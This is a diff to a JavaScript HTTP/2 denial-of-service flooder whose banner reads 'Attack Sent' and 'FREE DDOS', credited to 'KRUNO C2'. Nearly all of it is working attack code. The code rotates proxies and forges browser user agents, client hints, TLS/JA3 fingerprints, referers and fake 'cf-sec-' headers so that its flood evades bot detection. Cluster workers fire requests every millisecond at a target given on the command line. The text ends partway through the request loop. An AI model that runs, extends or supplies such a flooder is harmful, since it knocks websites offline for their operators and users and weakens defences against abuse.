@@ -82,7 +82,7 @@ const BROWSER_PROFILES = {
             "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
         })
     },
-    "edge": "chrome", "brave": "chrome", "opera": "chrome", "duckduckgo": "chrome",
+    "edge": "chrome", "brave": "chrome", "opera": "chrome", "operagx": "chrome", "duckduckgo": "chrome",
     "mobile-chrome": "chrome", "mobile-safari": "safari", "mobile-firefox": "firefox",
 };
 
@@ -105,7 +105,7 @@ function encodeSettings(settings) {
 
 const urihost = [
     'google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org',
-    'x.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
+    'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
 ];
 
 function encodeFrame(streamId, type, payload = "", flags = 0) {
@@ -121,14 +121,42 @@ function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
 function randomElement(elements) {
-    return elements[Math.floor(Math.random() * elements.length)];
+    return elements[randomIntn(0, elements.length - 1)];
+}
+
+function randstr(length) {
+    const characters = "0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
 }
 
 function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
+    const randomStringArray = Array.from({ length }, () => {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        return characters[randomIndex];
+    });
+    return randomStringArray.join('');
+}
+
+function randnum(minLength, maxLength) {
+    const characters = '0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    const randomStringArray = Array.from({ length }, () => {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        return characters[randomIndex];
+    });
+    return randomStringArray.join('');
 }
 
 const cplist = [
@@ -295,14 +323,15 @@ function getRandomHeapSize() {
 
 if (cluster.isMaster) {
     console.clear();
+    console.clear()
     console.log('\x1b[38;2;243;12;255m╔═════════════╦[+]║Attack \x1b[38;5;55mSent║[+]╦═════════════╗\x1b[0m');
     console.log(`\x1b[1;36m  [Target]   : \x1b[38;5;55m${process.argv[2]}\x1b[0m`);
     console.log(`\x1b[1;36m  [proxy]    : ${process.argv[6]}\x1b[38;5;55m   || Total: ${proxies.length.toString()}`);
     console.log(`\x1b[1;36m  [Duration] : \x1b[38;5;55m${process.argv[3]} seconds\x1b[0m`);
     console.log(`\x1b[1;36m  [Rate]     : \x1b[38;5;55m${process.argv[4]} req/s\x1b[0m`);
     console.log(`\x1b[1;36m  [Threads]  : \x1b[38;5;55m${process.argv[5]}\x1b[0m`);
-    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55m Minh Duc \x1b[0m`);
-    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║Leak \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');
+    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55m KRUNO C2 👑 \x1b[0m`);
+    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║FREE \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');
 
     const restartScript = () => {
         for (const id in cluster.workers) {
@@ -337,36 +366,111 @@ if (cluster.isMaster) {
     setInterval(runFlooder, 1);
 }
 
-const browsers = ["chrome", "safari", "firefox", "edge", "brave", "opera", "duckduckgo", "mobile-chrome", "mobile-safari", "mobile-firefox"];
+const HEADER_MAPS = {
+    "chrome": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-user": "?1",
+        "upgrade-insecure-requests": "1",
+        "dnt": "1",
+    },
+    "firefox": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.5",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "te": "trailers",
+        "upgrade-insecure-requests": "1",
+    },
+    "safari": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "upgrade-insecure-requests": "1",
+    },
+    "mobile-chrome": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-user": "?1",
+        "upgrade-insecure-requests": "1",
+        "dnt": "1",
+    },
+    "mobile-safari": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "upgrade-insecure-requests": "1",
+    },
+    "mobile-firefox": {
+        ":method": "GET",
+        ":scheme": "https",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.5",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "te": "trailers",
+        "upgrade-insecure-requests": "1",
+    },
+    "edge": "chrome",
+    "brave": "chrome",
+    "opera": "chrome",
+    "operagx": "chrome",
+    "duckduckgo": "chrome",
+};
+
+const browsers = ["chrome", "safari", "firefox", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome", "mobile-safari", "mobile-firefox"];
 const platformVersions = {
-    "Windows": ["10.0.0", "11.0.0"],
-    "macOS": ["10.15.7", "11.6.0", "12.0.0", "13.0.0", "14.0.0"],
+    "Windows": ["10.0", "11.0"],
+    "macOS": ["10.15.7", "11.6", "12.0", "13.0", "14.0"],
     "Linux": [undefined],
     "Android": ["10.0", "11.0", "12.0", "13.0", "14.0"],
     "iOS": ["15.0", "16.0", "17.0", "18.0"]
 };
-const architectures = ["x86_64", "arm64"];
-const mobileDevices = {
-    "Android": ["Pixel 6", "Samsung Galaxy S21", "Xiaomi 12", "OnePlus 9", "Huawei P40"],
-    "iOS": ["iPhone 12", "iPhone 13", "iPhone 14", "iPhone 15"]
-};
+const architectures = ["x86", "arm64", "arm"];
 
 const referers = [
-    "https://www.google.com/search?q=", "https://www.bing.com/search?q=", 
-    "https://www.youtube.com/watch?v=", "https://www.reddit.com/r/",
-    "https://x.com/explore", "https://www.facebook.com/",
-    "https://www.instagram.com/p/", "https://www.tiktok.com/@",
-    "https://www.linkedin.com/feed/", "https://www.wikipedia.org/wiki/"
+    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
+    "https://www.youtube.com/", "https://www.reddit.com/", "https://www.twitter.com/",
+    "https://www.facebook.com/", "https://www.instagram.com/", "https://www.tiktok.com/",
+    "https://www.linkedin.com/", "https://www.quora.com/", "https://news.ycombinator.com/",
+    "https://www.wikipedia.org/", "https://www.amazon.com/", "https://www.ebay.com/"
 ];
 const origins = [
-    "https://www.google.com", "https://www.youtube.com", 
-    "https://www.reddit.com", "https://x.com", 
-    "https://www.facebook.com", "https://www.instagram.com",
-    "https://www.tiktok.com", "https://www.linkedin.com"
+    "https://www.google.com", "https://www.youtube.com", "https://www.reddit.com",
+    "https://www.twitter.com", "https://www.facebook.com", "https://www.instagram.com",
+    "https://www.tiktok.com", "https://www.linkedin.com", "https://www.amazon.com"
 ];
 
 const resourcePaths = [
-    { path: parsedTarget.path || "/", dest: "document" },
+    { path: parsedTarget.path, dest: "document" },
     { path: '/assets/css/style.css', dest: "style" },
     { path: '/assets/js/main.js', dest: "script" },
     { path: '/images/logo.png', dest: "image" },
@@ -379,11 +483,12 @@ const resourcePaths = [
     { path: '/products/category/item', dest: "document" },
 ];
 
+
 function getRandomBrowser() {
     const weights = {
-        "chrome": 0.35, "mobile-chrome": 0.25, "safari": 0.15, "mobile-safari": 0.15,
-        "firefox": 0.05, "mobile-firefox": 0.03, "edge": 0.015, 
-        "brave": 0.01, "opera": 0.005, "duckduckgo": 0.005
+        "chrome": 0.40, "mobile-chrome": 0.25, "safari": 0.15, "mobile-safari": 0.10,
+        "firefox": 0.05, "mobile-firefox": 0.02, "edge": 0.01, "brave": 0.01,
+        "opera": 0.005, "operagx": 0.005, "duckduckgo": 0.005
     };
     const total = Object.values(weights).reduce((a, b) => a + b, 0);
     const rand = Math.random() * total;
@@ -396,161 +501,174 @@ function getRandomBrowser() {
 }
 
 function uapick(browser, version, platform, isMobile, fullVersion) {
-    const osVersion = randomElement(platformVersions[platform] || ["10.0"]);
-    const device = isMobile ? randomElement(mobileDevices[platform] || mobileDevices["Android"]) : "";
-    const osString = platform === "Windows" ? `Windows NT ${osVersion}; Win64; x64` :
-                     platform === "macOS" ? `Macintosh; Intel Mac OS X ${osVersion.replace(/\./g, "_")}` :
-                     platform === "Linux" ? "X11; Linux x86_64" :
-                     platform === "Android" ? `Linux; Android ${osVersion}; ${device}` :
-                     `iPhone; CPU iPhone OS ${osVersion.replace(/\./g, "_")} like Mac OS X`;
-
     const userAgents = {
-        "chrome": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
-        "safari": `Mozilla/5.0 (${osString}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
-        "firefox": `Mozilla/5.0 (${osString}${platform === "Android" ? "; Mobile" : ""}) Gecko/${version}.0 Firefox/${version}.0`,
-        "edge": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
-        "brave": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
-        "opera": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
-        "duckduckgo": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
-        "mobile-chrome": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
-        "mobile-safari": `Mozilla/5.0 (${osString}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
-        "mobile-firefox": `Mozilla/5.0 (${osString}; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
+        "chrome": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Linux; Android ${randomElement(platformVersions["Android"])}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
+        "safari": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}_1) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
+        "firefox": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Android ${randomElement(platformVersions["Android"])}; Mobile`}) Gecko/20100101 Firefox/${version}.0`,
+        "edge": `Mozilla/5.0 (Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
+        "brave": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
+        "opera": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
+        "operagx": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0 (Edition GX)`,
+        "duckduckgo": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : `Linux; Android ${randomElement(platformVersions["Android"])}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
+        "mobile-chrome": `Mozilla/5.0 (Linux; Android ${randomElement(platformVersions["Android"])}; ${["Pixel", "Samsung", "Xiaomi", "OnePlus"][Math.floor(Math.random() * 4)]} ${Math.floor(6 + Math.random() * 4)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
+        "mobile-safari": `Mozilla/5.0 (iPhone; CPU iPhone OS ${randomElement(platformVersions["iOS"])} like Mac OS X) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
+        "mobile-firefox": `Mozilla/5.0 (Android ${randomElement(platformVersions["Android"])}; Mobile; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
     };
     return userAgents[browser];
 }
 
-class SessionManager {
-    constructor() {
-        this.cookies = new Map();
-        this.cache = new Map();
-    }
-
-    addCookies(host, cookies) {
-        if (!this.cookies.has(host)) {
-            this.cookies.set(host, new Map());
+function headersArrayToObject(headersArray) {
+    const headersObject = {};
+    headersArray.forEach(([key, value]) => {
+        if (value !== undefined) {
+            headersObject[key] = value;
         }
-        const cookieMap = this.cookies.get(host);
-        cookies.forEach(cookie => {
-            const [name, value] = cookie.split(';')[0].split('=');
-            cookieMap.set(name.trim(), value.trim());
-        });
-    }
-
-    getCookieHeader(host) {
-        if (!this.cookies.has(host)) return null;
-        const cookieMap = this.cookies.get(host);
-        return Array.from(cookieMap.entries()).map(([name, value]) => `${name}=${value}`).join('; ');
-    }
-
-    addCacheHeaders(path, etag, lastModified) {
-        if (!this.cache.has(path)) {
-            this.cache.set(path, {});
-        }
-        const cacheEntry = this.cache.get(path);
-        if (etag) cacheEntry.etag = etag;
-        if (lastModified) cacheEntry.lastModified = lastModified;
-    }
-
-    getCacheHeaders(path) {
-        return this.cache.get(path) || null;
-    }
+    });
+    return headersObject;
 }
 
-function getRandomUA() {
-    const version = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
-    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
-}
-
-function headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode) {
-    const ua = getRandomUA();
-    const versionMatch = ua.match(/Chrome\/(\d+)/)[1];
-    const chromeVersion = parseInt(versionMatch);
-    let brandValue;
-    if (chromeVersion >= 127 && chromeVersion <= 130) {
-        brandValue = `"Not;A=Brand";v="8", "Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}"`;
-    } else if (chromeVersion >= 131 && chromeVersion <= 134) {
-        brandValue = `"Google Chrome";v="${chromeVersion}", "Not=A?Brand";v="99", "Chromium";v="${chromeVersion}"`;
-    } else if (chromeVersion >= 135 && chromeVersion <= 139) {
-        brandValue = `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`;
+const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode) => {
+    let profile = BROWSER_PROFILES[browser];
+    if (typeof profile === 'string') {
+        profile = BROWSER_PROFILES[profile];
     }
-    const secChUa = `${brandValue}`;
-    const secChUaFull = `${brandValue}`;
 
-    const resource = randomElement(resourcePaths);
     const acceptLanguagesMap = {
         "US": "en-US,en;q=0.9",
         "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
         "JP": "ja-JP,ja;q=0.9,en-US;q=0.8",
         "DE": "de-DE,de;q=0.9,en-US;q=0.8",
         "FR": "fr-FR,fr;q=0.9,en-US;q=0.8",
-        "CN": "zh-CN,zh;q=0.9,en-US;q=0.8"
     };
-    const acceptLanguage = acceptLanguagesMap[geoCountryCode] || "vi,en-US;q=0.9,en;q=0.8";
+    const defaultAcceptLanguage = "en-US,en;q=0.9";
+    const acceptLanguage = acceptLanguagesMap[geoCountryCode] || defaultAcceptLanguage;
 
-    const acceptTypes = {
-        "document": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "script": "application/javascript,*/*;q=0.8",
-        "style": "text/css,*/*;q=0.8",
-        "image": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
-        "empty": "application/json, text/plain, */*;q=0.8"
-    };
+    const secFetchSite = randomElement(profile.secFetchSites);
+    let referer = undefined;
+    let origin = undefined;
+
+    if (secFetchSite === "same-origin" || secFetchSite === "same-site") {
+        referer = `https://${parsedTarget.host}/`;
+        origin = `https://${parsedTarget.host}`;
+    } else if (secFetchSite === "cross-site") {
+        referer = randomElement(referers);
+        origin = randomElement(origins);
+    }
+
+    // Tạo sec-ch-ua động cho trình duyệt Chromium-based
+    const chromiumBased = ["chrome", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome"];
+    const secChUa = chromiumBased.includes(browser) ?
+        `"${browser === "chrome" || browser === "mobile-chrome" ? "Google Chrome" : browser === "edge" ? "Microsoft Edge" : browser === "brave" ? "Brave" : "Opera"}";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"` :
+        undefined;
 
     const headersArray = [
-        [":method", Math.random() < 0.95 ? "GET" : "HEAD"],
-        [":authority", parsedTarget.host],
+        [":method", "GET"],
+        [":authority", Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`],
         [":scheme", "https"],
-        [":path", resource.path],
-        ["user-agent", ua],
-        ["sec-ch-ua", secChUa],
+        [":path", parsedTarget.path || "/"],
+        ["user-agent", uapick(browser, version, platform, isMobile, fullVersion)],
+        ...(secChUa ? [["sec-ch-ua", secChUa]] : []),
         ["sec-ch-ua-mobile", isMobile ? "?1" : "?0"],
-        ["sec-ch-ua-platform", "\"Windows\""],
-        ["sec-ch-ua-full-version-list", secChUaFull],
-        ["accept", acceptTypes[resource.dest] || acceptTypes["document"]],
-        ["sec-fetch-site", "cross-site"],
-        ["sec-fetch-mode", resource.dest === "document" ? "navigate" : "cors"],
-        ["sec-fetch-user", resource.dest === "document" ? "?1" : undefined],
-        ["sec-fetch-dest", resource.dest],
-        ["referer", `https://www.google.com/search?q=${generateRandomString(5, 10)}`],
-        ["accept-encoding", "gzip, deflate, br, zstd"],
+        ["sec-ch-ua-platform", `"${platform}"`],
+        ...(secChUa ? [["sec-ch-ua-full-version-list", `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`]] : []),
+        ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
+        ["sec-fetch-site", secFetchSite],
+        ["sec-fetch-mode", randomElement(profile.secFetchModes)],
+        ["sec-fetch-user", Math.random() < 0.8 ? "?1" : undefined],
+        ["sec-fetch-dest", randomElement(profile.secFetchDests)],
+        ["referer", referer || "https://www.google.com/"],
+        ["accept-encoding", randomElement(profile.acceptEncodings)],
         ["accept-language", acceptLanguage],
-        ["upgrade-insecure-requests", "1"],
-        ["cache-control", "no-cache"],
-        ["priority", "u=0, i"]
+        ["upgrade-insecure-requests", Math.random() < 0.8 ? "1" : undefined],
+        ["cache-control", randomElement(profile.cacheControls)],
+        ["priority", Math.random() < 0.5 ? "u=0, i" : "u=1"],
     ];
 
-    const headers = Object.fromEntries(headersArray);
+    const baseHeaders = headersArrayToObject(headersArray);
+    const specificHeaders = profile.getSpecificHeaders(browser, version, platform, isMobile, fullVersion);
+    Object.assign(baseHeaders, specificHeaders);
 
-    if (Math.random() < 0.4) {
-        headers["if-modified-since"] = new Date(Date.now() - Math.floor(Math.random() * 86400000)).toUTCString();
+    if (referer) baseHeaders["referer"] = referer;
+    if (origin) baseHeaders["origin"] = origin;
+
+    Object.keys(baseHeaders).forEach(key => baseHeaders[key] === undefined && delete baseHeaders[key]);
+
+    return baseHeaders;
+};
+
+function taoDoiTuongNgauNhien() {
+    const doiTuong = {};
+    const maxi = getRandomInt(2, 3);
+    for (let i = 1; i <= maxi; i++) {
+        const key = 'cf-sec-' + generateRandomString(1, 9);
+        const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
+        doiTuong[key] = value;
     }
-    if (Math.random() < 0.3) {
-        headers["if-none-match"] = `"${generateRandomString(10, 20)}"`;
-    }
-
-    Object.keys(headers).forEach(key => headers[key] === undefined && delete headers[key]);
-
-    return headers;
+    return doiTuong;
 }
+
+class SessionManager {
+    constructor() {
+        this.cookies = {};
+        this.cacheHeaders = {};
+    }
+
+    addCookies(host, setCookieHeaders) {
+        if (!this.cookies[host]) {
+            this.cookies[host] = {};
+        }
+        setCookieHeaders.forEach(cookieStr => {
+            try {
+                const parts = cookieStr.split(';')[0].split('=');
+                if (parts.length >= 2) {
+                    this.cookies[host][parts[0].trim()] = parts.slice(1).join('=').trim();
+                }
+            } catch (e) {
+            }
+        });
+    }
+
+    getCookieHeader(host) {
+        if (this.cookies[host]) {
+            const cookieString = Object.entries(this.cookies[host]).map(([name, value]) => `${name}=${value}`).join('; ');
+            return cookieString || null;
+        }
+        return null;
+    }
+
+    addCacheHeaders(path, etag, lastModified) {
+        this.cacheHeaders[path] = { etag, lastModified };
+    }
+
+    getCacheHeaders(path) {
+        return this.cacheHeaders[path];
+    }
+}
+
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
+    const clength = randomElement(urihost);
 
-    const browser = "chrome";
+    const browser = getRandomBrowser();
     let browserProfile = BROWSER_PROFILES[browser];
     if (typeof browserProfile === 'string') {
         browserProfile = BROWSER_PROFILES[browserProfile];
     }
 
-    const version = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
-    const platform = "Windows";
-    const isMobile = false;
-    const fullVersion = `${version}.0.0.0`;
+    const version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
+    const platform = randomElement(browserProfile.platforms);
+    const isMobile = browser.includes("mobile");
+    const fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
 
     const baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
 
     let ja3Profile = JA3_PROFILES[browser];
+    if (typeof BROWSER_PROFILES[browser] === 'string') {
+        ja3Profile = JA3_PROFILES[BROWSER_PROFILES[browser]];
+    }
     if (!ja3Profile) {
         ja3Profile = {
             ciphers: ciphers,
@@ -568,10 +686,7 @@ function runFlooder() {
     };
 
     Socker.HTTP(proxyOptions, async (connection, error) => {
-        if (error) {
-            console.log(`[Error] Proxy connection failed: ${error}`);
-            return;
-        }
+        if (error) return;
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
 
@@ -600,6 +715,7 @@ function runFlooder() {
         });
         tlsOptions.secureContext = dynamicSecureContext;
 
+
         const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
 
         tlsSocket.allowHalfOpen = true;
@@ -611,7 +727,6 @@ function runFlooder() {
             const cipherInfo = socket.getCipher();
             const supportedVersions = socket.getProtocol();
             if (!cipherInfo) {
-                console.log('[Error] Failed to generate JA3 fingerprint: No cipher info');
                 return null;
             }
             const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
@@ -622,11 +737,6 @@ function runFlooder() {
 
         tlsSocket.on('connect', () => {
             const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
-            console.log(`[Info] TLS connected, JA3: ${ja3Fingerprint}`);
-        });
-
-        tlsSocket.on('error', (err) => {
-            console.log(`[Error] TLS error: ${err.message}`);
         });
 
         function getSettingsBasedOnISP(isp) {
@@ -697,7 +807,7 @@ function runFlooder() {
             return settings;
         }
 
-    let hpack = new HPACK();
+        let hpack = new HPACK();
         let client;
         const clients = [];
         client = http2.connect(parsedTarget.href, {
@@ -717,103 +827,126 @@ function runFlooder() {
         });
 
         client.on('connect', () => {
-            console.log('[Info] HTTP/2 connected');
-            client.ping((err, duration, payload) => {
-                if (err) console.log(`[Error] Ping failed: ${err.message}`);
-            });
+            client.ping((err, duration, payload) => {});
             client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
-        });
-
-        client.on('error', (err) => {
-            console.log(`[Error] HTTP/2 error: ${err.message}`);
         });
 
         const sessionManager = new SessionManager();
 
         clients.forEach(client => {
-            const intervalId = setInterval(async () => {
-                async function sendRequests() {
-                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                        const navigationSequence = resourcePaths.slice(0, Math.floor(Math.random() * 3) + 1);
+    const intervalId = setInterval(() => {
+        async function sendRequests() {
+            const shuffleObject = (obj) => {
+                const keys = Object.keys(obj);
+                for (let i = keys.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [keys[i], keys[j]] = [keys[j], keys[i]];
+                }
+                const shuffledObj = {};
+                keys.forEach(key => shuffledObj[key] = obj[key]);
+                return shuffledObj;
+            };
 
-                        for (const resource of navigationSequence) {
-                            const requestPromise = new Promise(async (resolve, reject) => {
-                                const selectedPath = resource.path;
-                                const secFetchDest = resource.dest;
-                                const method = Math.random() < 0.95 ? "GET" : "HEAD";
-
-                                const finalHeaders = {
-                                    ":method": method,
-                                    ":authority": baseHeaders[":authority"],
-                                    ":scheme": baseHeaders[":scheme"],
-                                    ":path": selectedPath,
-                                    ...baseHeaders,
-                                    "sec-fetch-dest": secFetchDest
-                                };
-
-                                const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
-                                if (cookieHeader) {
-                                    finalHeaders['cookie'] = cookieHeader;
-                                }
-
-                                const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
-                                if (cachedInfo) {
-                                    if (cachedInfo.etag) {
-                                        finalHeaders['if-none-match'] = cachedInfo.etag;
-                                    }
-                                    if (cachedInfo.lastModified) {
-                                        finalHeaders['if-modified-since'] = cachedInfo.lastModified;
-                                    }
-                                }
-
-                                Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);
-
-                                const req = client.request(finalHeaders, {
-                                    weight: Math.random() < 0.5 ? 251 : 231,
-                                    depends_on: 0,
-                                    exclusive: Math.random() < 0.5 ? true : false,
-                                })
-                                .on('response', response => {
-                                    console.log(`[Info] Request to ${selectedPath} - Status: ${response[':status']}`);
-                                    const setCookie = response['set-cookie'];
-                                    if (setCookie) {
-                                        sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
-                                    }
-
-                                    const etag = response['etag'];
-                                    const lastModified = response['last-modified'];
-                                    if (etag || lastModified) {
-                                        sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
-                                    }
-
-                                    req.close(http2.constants.NO_ERROR);
-                                    req.destroy();
-                                    resolve();
-                                })
-                                .on('error', (err) => {
-                                    console.log(`[Error] Request to ${selectedPath} failed: ${err.message}`);
-                                    reject(err);
-                                });
-
-                                req.on('end', () => {
-                                    resolve();
-                                });
-
-                                req.end();
-                            });
-
-                            await requestPromise.catch(() => {});
